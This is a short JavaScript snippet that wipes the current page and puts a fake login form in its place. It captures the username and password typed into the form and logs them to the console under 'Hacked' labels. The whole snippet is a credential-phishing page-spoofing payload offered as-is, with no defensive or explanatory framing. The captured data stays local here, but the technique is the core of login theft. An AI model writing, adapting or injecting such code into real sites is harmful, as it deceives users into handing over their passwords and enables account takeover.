// Create a fake login page
const fakeLoginPage = `
  <style>
    /* ...some CSS to style the login page... */
  </style>
  <form id="fakeLoginForm">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Login</button>
  </form>
`;

document.documentElement.innerHTML = fakeLoginPage;

// Log form submissions to the console
const form = document.getElementById('fakeLoginForm');

form.addEventListener('submit', (e) => {
  e.preventDefault();
  
  const username = form.elements['username'].value;
  const password = form.elements['password'].value;
  
  console.log(`%cHacked Username: %c${username}`, 'color: red', 'color: blue');
  console.log(`%cHacked Password: %c${password}`, 'color: red', 'color: blue');
});
